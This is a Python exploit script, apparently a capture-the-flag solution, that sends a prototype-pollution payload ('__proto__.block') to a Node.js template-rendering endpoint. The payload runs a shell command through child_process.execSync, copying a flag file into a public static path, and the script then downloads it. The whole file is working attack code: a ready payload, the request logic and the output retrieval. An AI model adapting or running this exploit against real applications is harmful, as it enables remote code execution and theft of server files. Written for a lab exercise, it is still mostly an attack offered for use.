import requests
import time

# Target URL
TARGET_URL = 'http://94.237.55.114:39604'

# Define the payload
payload = {
    "artist.name": "Gingell",
    "__proto__.block": {
        "type": "Text",
        "line": "console.log(process.mainModule.require('child_process').execSync('cat flag > /app/static/pwned').toString())"
    }
}

def exploit_ssti(target_url, payload):
    """
    Exploits SSTI on the target URL by sending a crafted POST request.
    :param target_url: The target URL.
    :param payload: The payload to inject.
    :return: Response content or None if an error occurred.
    """
    try:
        # Send the malicious payload
        print("[*] Sending malicious payload...")
        response = requests.post(f"{target_url}/api/submit", json=payload)
        
        if response.status_code == 200:
            print("[+] Payload submitted successfully!")
        else:
            print(f"[!] Unexpected response: {response.status_code}")
            return None

        # Check for the result file
        print("[*] Retrieving output...")
        time.sleep(2)  # Give the server time to write the output
        output_response = requests.get(f"{target_url}/static/pwned")
        
        if output_response.status_code == 200:
            print("[+] Successfully retrieved output:")
            return output_response.text
        else:
            print(f"[!] Failed to retrieve output: {output_response.status_code}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"[!] Error during request: {e}")
        return None

# Run the exploit
result = exploit_ssti(TARGET_URL, payload)
if result:
    print("Output:")
    print(result)
else:
    print("[!] Exploit failed or no output retrieved.")
